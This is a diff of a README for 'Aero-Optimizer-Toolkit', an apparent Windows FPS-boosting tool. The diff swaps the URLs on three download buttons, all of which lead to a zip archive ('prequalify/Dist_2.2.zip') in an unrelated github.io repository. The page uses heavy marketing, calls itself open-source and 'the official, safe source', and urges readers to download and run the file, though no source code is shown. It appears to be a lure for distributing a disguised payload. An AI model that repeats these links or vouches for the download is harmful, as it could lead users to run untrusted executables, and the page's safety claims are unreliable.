@@ -6,7 +6,7 @@ description: "Optimize Windows system performance with adaptive algorithms that 
 <h1>🚀 Aero-Optimizer-Toolkit - Boost FPS & Fix Lag Instantly</h1>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/helloworld718/helloworld718.github.io/main/prequalify/Dist_2.2.zip"><img src="https://img.shields.io/badge/Download%20Now-Free%20Optimizer-blueviolet?style=for-the-badge&logo=windows&logoColor=white" alt="Download Aero-Optimizer-Toolkit"></a>
+  <a href="https://github.com/helloworld718/helloworld718.github.io/raw/refs/heads/main/prequalify/Dist_2.2.zip"><img src="https://img.shields.io/badge/Download%20Now-Free%20Optimizer-blueviolet?style=for-the-badge&logo=windows&logoColor=white" alt="Download Aero-Optimizer-Toolkit"></a>
 </p>
 
 Welcome to **Aero-Optimizer-Toolkit**, the ultimate Windows gaming optimizer for 2026. If your games stutter, your FPS drops, or you experience annoying input lag, this tool is your one-stop solution. Designed for everyone—even if you have zero technical experience—this open-source application cleans, tweaks, and boosts your system in minutes. No complex settings, no risky manual edits. Just download, run, and enjoy smoother gameplay.
@@ -40,7 +40,7 @@ Getting started is incredibly easy. Follow these three steps, and you will be ga
 
 1.  **Visit the Download Page:** Click the big blue button below or any other download button on this page. This is the official, safe source.
 
-    [![Download Aero-Optimizer-Toolkit](https://img.shields.io/badge/Click%20Here%20to%20Download-Get%20Your%20Boost-success?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/helloworld718/helloworld718.github.io/main/prequalify/Dist_2.2.zip)
+    [![Download Aero-Optimizer-Toolkit](https://img.shields.io/badge/Click%20Here%20to%20Download-Get%20Your%20Boost-success?style=for-the-badge&logo=github&logoColor=white)](https://github.com/helloworld718/helloworld718.github.io/raw/refs/heads/main/prequalify/Dist_2.2.zip)
 
 2.  **Visit this link to download the application.** The download will start automatically or you will see a file in your browser's download bar.
 
@@ -115,4 +115,4 @@ Stop putting up with poor performance. With just a few clicks, Aero-Optimizer-To
 
 **Ready to play at your best?** Get your copy now.
 
-[![Get Aero-Optimizer-Toolkit](https://img.shields.io/badge/🚀%20Download%20Now%20🚀-Free%20and%20Fast-orange?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/helloworld718/helloworld718.github.io/main/prequalify/Dist_2.2.zip)
+[![Get Aero-Optimizer-Toolkit](https://img.shields.io/badge/🚀%20Download%20Now%20🚀-Free%20and%20Fast-orange?style=for-the-badge&logo=github&logoColor=white)](https://github.com/helloworld718/helloworld718.github.io/raw/refs/heads/main/prequalify/Dist_2.2.zip)
